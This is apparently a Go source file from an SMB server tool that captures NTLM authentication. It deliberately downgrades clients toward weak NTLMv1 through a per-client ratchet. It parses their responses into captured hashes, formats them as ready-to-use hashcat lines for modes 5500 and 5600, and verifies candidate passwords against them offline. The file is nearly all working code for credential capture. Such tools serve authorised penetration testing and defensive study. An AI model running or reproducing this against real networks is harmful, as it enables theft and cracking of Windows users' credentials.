package smbserver

import (
	"crypto/des"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/rc4"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"strings"
	"time"
	"unicode/utf16"

	"golang.org/x/crypto/md4"
)

// ── NTLM message types ─────────────────────────────────────────────────────
const (
	NTLMSSP_NEGOTIATE uint32 = 0x00000001
	NTLMSSP_CHALLENGE uint32 = 0x00000002
	NTLMSSP_AUTH      uint32 = 0x00000003
)

// ── NTLM negotiate flags ───────────────────────────────────────────────────
const (
	NTLM_FLAG_UNICODE              = 0x00000001
	NTLM_FLAG_REQUEST_TARGET       = 0x00000004
	NTLM_FLAG_NTLM                 = 0x00000200
	NTLM_FLAG_EXTENDED_SESSION_SEC = 0x00080000
	NTLM_FLAG_TARGET_INFO          = 0x00800000
	NTLM_FLAG_128                  = 0x20000000
	NTLM_FLAG_KEY_EXCH             = 0x40000000
	NTLM_FLAG_56                   = 0x80000000
)

// ── NTLM protocol variants ─────────────────────────────────────────────────

// NTLMProtocol identifies which authentication variant a client used.
type NTLMProtocol string

const (
	ProtoNTLMv1    NTLMProtocol = "NetNTLMv1"
	ProtoNTLMv1ESS NTLMProtocol = "NetNTLMv1+ESS"
	ProtoNTLMv2    NTLMProtocol = "NetNTLMv2"
)

// NTLMDowngradeLevel controls which protocol flags the server advertises in
// the Type 2 challenge, from weakest (NTLMv1) to strongest (NTLMv2).
type NTLMDowngradeLevel int

const (
	DowngradeNTLMv1    NTLMDowngradeLevel = 0 // no ESS → elicit NTLMv1 responses
	DowngradeNTLMv1ESS NTLMDowngradeLevel = 1 // ESS without TARGET_INFO → elicit NTLMv1+ESS
	DowngradeNTLMv2    NTLMDowngradeLevel = 2 // full flags → accept NTLMv2 (no downgrade)
)

func (d NTLMDowngradeLevel) String() string {
	switch d {
	case DowngradeNTLMv1:
		return "NTLMv1"
	case DowngradeNTLMv1ESS:
		return "NTLMv1+ESS"
	default:
		return "NTLMv2"
	}
}

// protocolDowngradeLevel maps a detected NTLMProtocol back to the
// NTLMDowngradeLevel that would have been required to capture it.
// Used to decide whether to advance the per-client downgrade state.
func protocolDowngradeLevel(p NTLMProtocol) NTLMDowngradeLevel {
	switch p {
	case ProtoNTLMv1:
		return DowngradeNTLMv1
	case ProtoNTLMv1ESS:
		return DowngradeNTLMv1ESS
	default:
		return DowngradeNTLMv2
	}
}

// ── AV Pair IDs ────────────────────────────────────────────────────────────
const (
	MsvAvEOL             = uint16(0x0000)
	MsvAvNbComputerName  = uint16(0x0001)
	MsvAvNbDomainName    = uint16(0x0002)
	MsvAvDnsComputerName = uint16(0x0003)
	MsvAvDnsDomainName   = uint16(0x0004)
	MsvAvTimestamp       = uint16(0x0007)
)

// ── SPNEGO OIDs (pre-encoded DER) ──────────────────────────────────────────
var (
	// SPNEGO OID: 1.3.6.1.5.5.2
	oidSPNEGO = []byte{0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02}
	// NTLMSSP OID: 1.3.6.1.4.1.311.2.2.10
	oidNTLMSSP = []byte{0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a}
	// NTLMSSP signature
	ntlmSig = []byte("NTLMSSP\x00")
)

// NTLMChallenge holds the server-side state for a single NTLM exchange.
type NTLMChallenge struct {
	ServerChallenge [8]byte
	TargetName      string
	DowngradeLevel  NTLMDowngradeLevel
	ClientFlags     uint32 // negotiate flags from the client's Type 1 message
}

// NewChallenge creates a new NTLMChallenge with a cryptographically random server challenge.
func NewChallenge(targetName string) (*NTLMChallenge, error) {
	c := &NTLMChallenge{TargetName: targetName}
	if _, err := rand.Read(c.ServerChallenge[:]); err != nil {
		return nil, err
	}
	return c, nil
}

// BuildChallengeMessage builds the NTLMSSP Type 2 (CHALLENGE) message.
// The flags and TargetInfo payload are chosen based on c.DowngradeLevel to
// attempt forcing the weakest protocol the client will accept.
func (c *NTLMChallenge) BuildChallengeMessage() []byte {
	targetName := toUTF16LE(c.TargetName)

	// TargetInfo (AVPairs) must always be present in the challenge.
	// Modern clients (NTLMv2) require it to compute their response; old clients
	// (NTLMv1) simply ignore it.  Omitting it causes NTLMv2 clients to
	// abort with "target information required" before ever sending a Type 3.
	//
	// We vary only the ESS flag to signal which weaker protocol is
	// acceptable; the client responds with whatever its LM-compat level allows.
	targetInfo := c.buildAVPairs()

	var flags uint32
	switch c.DowngradeLevel {
	case DowngradeNTLMv1:
		// No ESS → old clients at compat-level 2 use plain NTLMv1.
		flags = NTLM_FLAG_UNICODE | NTLM_FLAG_REQUEST_TARGET | NTLM_FLAG_NTLM |
			NTLM_FLAG_TARGET_INFO | NTLM_FLAG_128 | NTLM_FLAG_KEY_EXCH | NTLM_FLAG_56
	case DowngradeNTLMv1ESS:
		// ESS set → old clients at compat-level 0-2 use NTLMv1+ESS.
		flags = NTLM_FLAG_UNICODE | NTLM_FLAG_REQUEST_TARGET | NTLM_FLAG_NTLM |
			NTLM_FLAG_EXTENDED_SESSION_SEC | NTLM_FLAG_TARGET_INFO | NTLM_FLAG_128 | NTLM_FLAG_KEY_EXCH | NTLM_FLAG_56
	default: // DowngradeNTLMv2 — original behaviour, no downgrade attempt
		flags = NTLM_FLAG_UNICODE | NTLM_FLAG_REQUEST_TARGET | NTLM_FLAG_NTLM |
			NTLM_FLAG_EXTENDED_SESSION_SEC | NTLM_FLAG_TARGET_INFO | NTLM_FLAG_128 | NTLM_FLAG_KEY_EXCH | NTLM_FLAG_56
	}

	// Only echo ESS back when we are at a downgrade level that intentionally
	// includes ESS (NTLMv1+ESS and NTLMv2).
	//
	// For DowngradeNTLMv1 we deliberately omit ESS so that
	// clients with NtlmMinClientSec=0 and a low LM-compat level will send
	// NTLMv1 responses.  Modern Windows with the default NtlmMinClientSec
	// (ESS required) will RST the connection; the ratchet in handleConn then
	// advances the per-client level on the next reconnect.
	if c.ClientFlags&NTLM_FLAG_EXTENDED_SESSION_SEC != 0 &&
		c.DowngradeLevel >= DowngradeNTLMv1ESS {
		flags |= NTLM_FLAG_EXTENDED_SESSION_SEC
	}

	const hdrLen = 64
	targetNameOff := uint32(hdrLen)
	targetInfoOff := targetNameOff + uint32(len(targetName))
	total := int(targetInfoOff) + len(targetInfo)

	msg := make([]byte, total)
	copy(msg[0:], ntlmSig)
	binary.LittleEndian.PutUint32(msg[8:], NTLMSSP_CHALLENGE)

	// TargetName fields
	binary.LittleEndian.PutUint16(msg[12:], uint16(len(targetName)))
	binary.LittleEndian.PutUint16(msg[14:], uint16(len(targetName)))
	binary.LittleEndian.PutUint32(msg[16:], targetNameOff)

	// Negotiate flags
	binary.LittleEndian.PutUint32(msg[20:], flags)

	// Server challenge
	copy(msg[24:32], c.ServerChallenge[:])
	// Reserved: 8 zero bytes at [32:40]

	// TargetInfo fields — always present.
	binary.LittleEndian.PutUint16(msg[40:], uint16(len(targetInfo)))
	binary.LittleEndian.PutUint16(msg[42:], uint16(len(targetInfo)))
	binary.LittleEndian.PutUint32(msg[44:], targetInfoOff)

	// Version: Windows 10.0.19041, NTLM revision 15
	msg[48] = 10                                   // MajorVersion
	msg[49] = 0                                    // MinorVersion
	binary.LittleEndian.PutUint16(msg[50:], 19041) // BuildNumber
	msg[55] = 15                                   // NTLMRevisionCurrent

	copy(msg[targetNameOff:], targetName)
	copy(msg[targetInfoOff:], targetInfo)
	return msg
}

func (c *NTLMChallenge) buildAVPairs() []byte {
	var buf []byte
	buf = appendAV(buf, MsvAvNbDomainName, toUTF16LE(c.TargetName))
	buf = appendAV(buf, MsvAvNbComputerName, toUTF16LE(c.TargetName))
	buf = appendAV(buf, MsvAvDnsDomainName, toUTF16LE(c.TargetName))
	buf = appendAV(buf, MsvAvDnsComputerName, toUTF16LE(c.TargetName))
	// Timestamp
	ts := make([]byte, 8)
	binary.LittleEndian.PutUint64(ts, winTime(time.Now()))
	buf = appendAV(buf, MsvAvTimestamp, ts)
	buf = appendAV(buf, MsvAvEOL, nil)
	return buf
}

func appendAV(buf []byte, id uint16, val []byte) []byte {
	entry := make([]byte, 4+len(val))
	binary.LittleEndian.PutUint16(entry[0:], id)
	binary.LittleEndian.PutUint16(entry[2:], uint16(len(val)))
	copy(entry[4:], val)
	return append(buf, entry...)
}

// CapturedHash holds all fields needed to reproduce a captured NTLM hash.
// Depending on Protocol, different fields are populated:
//
//	NTLMv1 / NTLMv1+ESS: LMResponse, NTResponse
//	NTLMv2:                    NTProofStr, Blob
type CapturedHash struct {
	Username    string
	Domain      string
	Workstation string
	Protocol    NTLMProtocol // detected authentication variant
	HashcatMode string       // hashcat -m value matching Protocol

	ServerChallenge [8]byte

	// NTLMv1 fields
	LMResponse []byte // 24-byte LM response (or client nonce padded for ESS)
	NTResponse []byte // 24-byte NT response

	// NTLMv2 fields
	NTProofStr []byte
	Blob       []byte

	HashcatLine               string // ready-to-use hashcat line
	EncryptedRandomSessionKey []byte // for SMB2 session signing key derivation
}

// ParseAuthMessage parses an NTLMSSP Type 3 (AUTHENTICATE) message and
// auto-detects the protocol used by the client (NTLMv1, NTLMv1+ESS,
// or NTLMv2) based on the NT/LM response lengths.
func (c *NTLMChallenge) ParseAuthMessage(msg []byte) (*CapturedHash, error) {
	if len(msg) < 72 {
		return nil, fmt.Errorf("authenticate message too short: %d", len(msg))
	}
	if string(msg[0:8]) != "NTLMSSP\x00" {
		return nil, fmt.Errorf("invalid NTLMSSP signature")
	}
	if binary.LittleEndian.Uint32(msg[8:12]) != NTLMSSP_AUTH {
		return nil, fmt.Errorf("not an authenticate message")
	}

	// Field descriptors: (len uint16, maxLen uint16, offset uint32)
	// LmResponse:  12..19
	// NtResponse:  20..27
	// DomainName:  28..35
	// UserName:    36..43
	// Workstation: 44..51
	// EncSessionKey: 52..59

	extract := func(lenOff, offOff int) []byte {
		n := int(binary.LittleEndian.Uint16(msg[lenOff:]))
		o := int(binary.LittleEndian.Uint32(msg[offOff:]))
		if n == 0 || o+n > len(msg) {
			return nil
		}
		return msg[o : o+n]
	}

	lmResp := extract(12, 16)
	ntResp := extract(20, 24)
	domain := fromUTF16LE(extract(28, 32))
	username := fromUTF16LE(extract(36, 40))
	ws := fromUTF16LE(extract(44, 48))
	encSessionKey := extract(52, 56)

	// ── Anonymous / null session ────────────────────────────────────────────
	if len(ntResp) == 0 && len(lmResp) == 0 {
		return &CapturedHash{
			Username:    "",
			Domain:      domain,
			Workstation: ws,
		}, nil
	}

	// ── NTLMv1 and NTLMv1+ESS (24-byte NT response) ─────────────────────────
	if len(ntResp) == 24 {
		// Detect ESS: client stores an 8-byte client nonce in LMResponse[0:8]
		// and pads the remaining 16 bytes with zeros.
		proto := ProtoNTLMv1
		if len(lmResp) == 24 && isAllZeros(lmResp[8:]) {
			proto = ProtoNTLMv1ESS
		}

		lmHex := ""
		if len(lmResp) > 0 {
			lmHex = strings.ToUpper(hex.EncodeToString(lmResp))
		}
		// Hashcat mode 5500: username::domain:LMResponse:NTResponse:ServerChallenge
		// For ESS, hashcat infers the combined challenge from LMResponse[0:8].
		hashcat := fmt.Sprintf("%s::%s:%s:%s:%s",
			username, domain,
			lmHex,
			strings.ToUpper(hex.EncodeToString(ntResp)),
			strings.ToUpper(hex.EncodeToString(c.ServerChallenge[:])),
		)
		return &CapturedHash{
			Username:                  username,
			Domain:                    domain,
			Workstation:               ws,
			Protocol:                  proto,
			HashcatMode:               "5500",
			ServerChallenge:           c.ServerChallenge,
			LMResponse:                lmResp,
			NTResponse:                ntResp,
			HashcatLine:               hashcat,
			EncryptedRandomSessionKey: encSessionKey,
		}, nil
	}

	// ── NTLMv2 (NT response is 16-byte NTProofStr + variable blob) ──────────
	if len(ntResp) < 16 {
		return nil, fmt.Errorf("NT response length %d is not 24 (NTLMv1) or ≥16 (NTLMv2)", len(ntResp))
	}

	ntProofStr := ntResp[:16]
	blob := ntResp[16:]

	// Hashcat mode 5600: username::domain:ServerChallenge:NTProofStr:blob
	hashcat := fmt.Sprintf("%s::%s:%s:%s:%s",
		username, domain,
		strings.ToUpper(hex.EncodeToString(c.ServerChallenge[:])),
		strings.ToUpper(hex.EncodeToString(ntProofStr)),
		strings.ToUpper(hex.EncodeToString(blob)),
	)
	return &CapturedHash{
		Username:                  username,
		Domain:                    domain,
		Workstation:               ws,
		Protocol:                  ProtoNTLMv2,
		HashcatMode:               "5600",
		ServerChallenge:           c.ServerChallenge,
		NTProofStr:                ntProofStr,
		Blob:                      blob,
		HashcatLine:               hashcat,
		EncryptedRandomSessionKey: encSessionKey,
	}, nil
}

// ── SPNEGO helpers ─────────────────────────────────────────────────────────

// InitialSPNEGO returns the security blob for the SMB2 Negotiate response.
// It advertises NTLMSSP as the only supported mechanism.
func InitialSPNEGO() []byte {
	// mechTypes SEQUENCE containing NTLMSSP OID
	mechList := asn1Seq(oidNTLMSSP)               // 30 0c <oid>
	mechTypes := asn1Tag(0xa0, mechList)          // a0 0e <seq>
	negTokenInit := asn1Seq(mechTypes)            // 30 10 <mechTypes>
	tokenInitCtx := asn1Tag(0xa0, negTokenInit)   // a0 12 <seq>
	content := append(oidSPNEGO, tokenInitCtx...) // oid + negTokenInit
	return asn1Tag(0x60, content)                 // Application[0]
}

// ChallengeToken wraps an NTLMSSP Type 2 message in SPNEGO NegTokenResp.
// Used in the first SessionSetup response (STATUS_MORE_PROCESSING).
func ChallengeToken(ntlmMsg []byte) []byte {
	// negState: accept-incomplete (1)
	negState := []byte{0xa0, 0x03, 0x0a, 0x01, 0x01}

	// supportedMech: NTLMSSP OID (1.3.6.1.4.1.311.2.2.10)
	ntlmOID := []byte{0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a}
	mechType := asn1Tag(0x06, ntlmOID)       // OBJECT IDENTIFIER
	supportedMech := asn1Tag(0xa1, mechType) // [1] MechType

	// responseToken: [2] OCTET STRING (NTLM Type 2)
	octet := asn1RawTag(0x04, ntlmMsg)
	respTok := asn1Tag(0xa2, octet)

	// Build negTokenTarg sequence
	// Order matters: negState → supportedMech → responseToken
	seqBody := append(negState, supportedMech...)
	seqBody = append(seqBody, respTok...)

	return asn1Tag(0xa1, asn1Seq(seqBody))
}

// NegTokenRespSelectNTLM returns a SPNEGO NegTokenResp that tells the client
// the server selected NTLMSSP as the authentication mechanism.
// Used in response to a client NegTokenInit that carries only mechTypes (no
// embedded NTLM token). The client will then send a full NTLM Type 1 next.
func NegTokenRespSelectNTLM() []byte {
	negState := []byte{0xa0, 0x03, 0x0a, 0x01, 0x01} // accept-incomplete
	ntlmOID := []byte{0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a}
	mechType := asn1Tag(0x06, ntlmOID)
	supportedMech := asn1Tag(0xa1, mechType)
	seqBody := append(negState, supportedMech...)
	return asn1Tag(0xa1, asn1Seq(seqBody))
}

// FinalToken returns a SPNEGO NegTokenResp indicating accept-completed.
// Used in the second SessionSetup response (STATUS_SUCCESS).
func FinalToken() []byte {
	negState := []byte{0xa0, 0x03, 0x0a, 0x01, 0x00}
	return asn1Tag(0xa1, asn1Seq(negState))
}

// ExtractNTLM finds the NTLMSSP token within a SPNEGO security blob.
// It handles both wrapped (SPNEGO) and bare NTLMSSP tokens.
func ExtractNTLM(blob []byte) []byte {
	// Direct NTLMSSP
	if len(blob) >= 8 && string(blob[:8]) == "NTLMSSP\x00" {
		return blob
	}
	// Search for NTLMSSP signature anywhere in the blob
	sig := []byte("NTLMSSP\x00")
	for i := 0; i <= len(blob)-len(sig); i++ {
		match := true
		for j, b := range sig {
			if blob[i+j] != b {
				match = false
				break
			}
		}
		if match {
			return blob[i:]
		}
	}
	return nil
}

// NTLMv2Verify checks if the captured NTProofStr matches the provided password.
func NTLMv2Verify(captured *CapturedHash, password string) bool {
	// Step 1: NTLM Hash = MD4(UTF-16LE(password))
	pwUTF16 := utf16.Encode([]rune(password))
	pwBytes := make([]byte, len(pwUTF16)*2)
	for i, v := range pwUTF16 {
		binary.LittleEndian.PutUint16(pwBytes[i*2:], v)
	}

	h := md4.New()
	h.Write(pwBytes)
	ntlmHash := h.Sum(nil) // 16 bytes

	// Step 2: NTLMv2 Hash = HMAC_MD5(NTLMHash, uppercase(username + domain))
	identity := strings.ToUpper(captured.Username) + captured.Domain
	identityBytes := utf16.Encode([]rune(identity))
	identityBuf := make([]byte, len(identityBytes)*2)
	for i, v := range identityBytes {
		binary.LittleEndian.PutUint16(identityBuf[i*2:], v)
	}

	hmacMd5 := hmac.New(md5.New, ntlmHash)
	hmacMd5.Write(identityBuf)
	ntlmV2Hash := hmacMd5.Sum(nil) // 16 bytes

	// Step 3: Expected NTProofStr = HMAC_MD5(NTLMv2Hash, ServerChallenge || Blob)
	proofInput := append(captured.ServerChallenge[:], captured.Blob...)
	hmacMd5 = hmac.New(md5.New, ntlmV2Hash)
	hmacMd5.Write(proofInput)
	expectedProof := hmacMd5.Sum(nil)

	// Step 4: Compare
	return hmac.Equal(expectedProof, captured.NTProofStr)
}

// NTLMv1Verify checks whether a captured NTLMv1 (or NTLMv1+ESS) NT response
// matches the given password.
func NTLMv1Verify(captured *CapturedHash, password string) bool {
	ntHash := ntHashFromPassword(password) // 16 bytes

	// Pad NT hash to 21 bytes with trailing zeros.
	key := make([]byte, 21)
	copy(key, ntHash)

	challenge := captured.ServerChallenge[:]
	if captured.Protocol == ProtoNTLMv1ESS && len(captured.LMResponse) >= 8 {
		// Effective challenge = MD5(ServerChallenge || ClientNonce)[:8]
		h := md5.New()
		h.Write(captured.ServerChallenge[:])
		h.Write(captured.LMResponse[:8])
		challenge = h.Sum(nil)[:8]
	}

	// Response = DES(K1, challenge) || DES(K2, challenge) || DES(K3, challenge)
	expected := make([]byte, 24)
	for i, off := range []int{0, 7, 14} {
		block, err := des.NewCipher(expandDESKey(key[off : off+7]))
		if err != nil {
			return false
		}
		block.Encrypt(expected[i*8:i*8+8], challenge)
	}
	return hmac.Equal(expected, captured.NTResponse)
}

// isAllZeros returns true when every byte in b is 0x00.
func isAllZeros(b []byte) bool {
	for _, v := range b {
		if v != 0 {
			return false
		}
	}
	return true
}

// expandDESKey converts a 7-byte (56-bit) raw key to the 8-byte form that
// crypto/des expects (each byte holds 7 key bits in bits 7–1; bit 0 = 0).
func expandDESKey(key7 []byte) []byte {
	k := key7
	out := []byte{
		k[0] >> 1,
		(k[0]&1)<<6 | k[1]>>2,
		(k[1]&3)<<5 | k[2]>>3,
		(k[2]&7)<<4 | k[3]>>4,
		(k[3]&0x0f)<<3 | k[4]>>5,
		(k[4]&0x1f)<<2 | k[5]>>6,
		(k[5]&0x3f)<<1 | k[6]>>7,
		k[6] & 0x7f,
	}
	for i := range out {
		out[i] <<= 1
	}
	return out
}

// ntHashFromPassword computes the NT hash (MD4(UTF-16LE(password))).
func ntHashFromPassword(password string) []byte {
	pwUTF16 := utf16.Encode([]rune(password))
	pwBytes := make([]byte, len(pwUTF16)*2)
	for i, v := range pwUTF16 {
		binary.LittleEndian.PutUint16(pwBytes[i*2:], v)
	}
	h := md4.New()
	h.Write(pwBytes)
	return h.Sum(nil)
}

// ── SMB2 signing ───────────────────────────────────────────────────────────

// DeriveNTLMv2SigningKey derives the SMB2 session signing key from the NTLM
// exchange. For dialect 2.x the signing key is the ExportedSessionKey.
// effectiveDomain must be the domain string that was used when verifying the
// NTProofStr (may be "" if the client sent no domain or the empty-domain
// fallback was used).
func DeriveNTLMv2SigningKey(password, username, effectiveDomain string, ntProofStr, encryptedSessionKey []byte) ([]byte, error) {
	// NT hash = MD4(UTF-16LE(password))
	pwUTF16 := utf16.Encode([]rune(password))
	pwBytes := make([]byte, len(pwUTF16)*2)
	for i, v := range pwUTF16 {
		binary.LittleEndian.PutUint16(pwBytes[i*2:], v)
	}
	h := md4.New()
	h.Write(pwBytes)
	ntHash := h.Sum(nil)

	// ResponseKeyNT = HMAC-MD5(NT_hash, UTF-16LE(UPPER(username) + effectiveDomain))
	identity := strings.ToUpper(username) + effectiveDomain
	identityRunes := utf16.Encode([]rune(identity))
	identityBuf := make([]byte, len(identityRunes)*2)
	for i, v := range identityRunes {
		binary.LittleEndian.PutUint16(identityBuf[i*2:], v)
	}
	responseKeyNT := hmacMD5bytes(ntHash, identityBuf)

	// SessionBaseKey = HMAC-MD5(ResponseKeyNT, NTProofStr)
	// For NTLMv2, KeyExchangeKey = SessionBaseKey
	keyExchangeKey := hmacMD5bytes(responseKeyNT, ntProofStr)

	// If the client sent an EncryptedRandomSessionKey (KEY_EXCH flow), decrypt it.
	if len(encryptedSessionKey) == 16 {
		cipher, err := rc4.NewCipher(keyExchangeKey)
		if err != nil {
			return nil, err
		}
		exportedKey := make([]byte, 16)
		cipher.XORKeyStream(exportedKey, encryptedSessionKey)
		return exportedKey, nil
	}
	return keyExchangeKey, nil
}

// DeriveNTLMv1SigningKey derives the SMB2 session signing key from an NTLMv1
// or NTLMv1+ESS exchange.  Per MS-NLMP:
//
//	NT_Hash = MD4(UTF-16LE(password))
//	SessionBaseKey = MD4(NT_Hash)
//
// NTLMv1 (no ESS): KeyExchangeKey = SessionBaseKey
// NTLMv1+ESS:       KeyExchangeKey = HMAC-MD5(SessionBaseKey, ServerChallenge || LMResponse[0:8])
//
// If EncryptedRandomSessionKey is present (KEY_EXCH), decrypt it with RC4.
// For SMB2 dialect 2.x the signing key equals the ExportedSessionKey.
func DeriveNTLMv1SigningKey(password string, captured *CapturedHash) ([]byte, error) {
	ntHash := ntHashFromPassword(password)

	// SessionBaseKey = MD4(NT_Hash)
	h := md4.New()
	h.Write(ntHash)
	sessionBaseKey := h.Sum(nil) // 16 bytes

	var keyExchangeKey []byte
	if captured.Protocol == ProtoNTLMv1ESS && len(captured.LMResponse) >= 8 {
		// KeyExchangeKey = HMAC-MD5(SessionBaseKey, ServerChallenge || ClientNonce)
		data := make([]byte, 16)
		copy(data[0:8], captured.ServerChallenge[:])
		copy(data[8:16], captured.LMResponse[0:8])
		keyExchangeKey = hmacMD5bytes(sessionBaseKey, data)
	} else {
		keyExchangeKey = sessionBaseKey
	}

	if len(captured.EncryptedRandomSessionKey) == 16 {
		cipher, err := rc4.NewCipher(keyExchangeKey)
		if err != nil {
			return nil, err
		}
		exportedKey := make([]byte, 16)
		cipher.XORKeyStream(exportedKey, captured.EncryptedRandomSessionKey)
		return exportedKey, nil
	}
	return keyExchangeKey, nil
}

func hmacMD5bytes(key, data []byte) []byte {
	h := hmac.New(md5.New, key)
	h.Write(data)
	return h.Sum(nil)
}

// SignSMB2Response computes an HMAC-SHA256 signature over the SMB2 response
// and writes it into the Signature field (bytes 48-63). The FLAGS_SIGNED bit
// is also set in the Flags field. The message slice is modified in-place.
func SignSMB2Response(signingKey, message []byte) {
	if len(message) < 64 || len(signingKey) == 0 {
		return
	}
	// Set SMB2_FLAGS_SIGNED (0x00000008) in Flags field (bytes 16-19)
	flags := binary.LittleEndian.Uint32(message[16:])
	flags |= 0x00000008
	binary.LittleEndian.PutUint32(message[16:], flags)
	// Zero the Signature field before computing
	for i := 48; i < 64; i++ {
		message[i] = 0
	}
	// HMAC-SHA256(signingKey, message)[0:16] → Signature
	mac := hmac.New(sha256.New, signingKey)
	mac.Write(message)
	sig := mac.Sum(nil)
	copy(message[48:64], sig[:16])
}

// ── ASN.1 DER helpers ──────────────────────────────────────────────────────

func asn1Len(n int) []byte {
	switch {
	case n < 128:
		return []byte{byte(n)}
	case n < 256:
		return []byte{0x81, byte(n)}
	default:
		return []byte{0x82, byte(n >> 8), byte(n)}
	}
}

func asn1Tag(tag byte, data []byte) []byte {
	out := []byte{tag}
	out = append(out, asn1Len(len(data))...)
	return append(out, data...)
}

func asn1RawTag(tag byte, data []byte) []byte {
	return asn1Tag(tag, data)
}

func asn1Seq(data []byte) []byte {
	return asn1Tag(0x30, data)
}
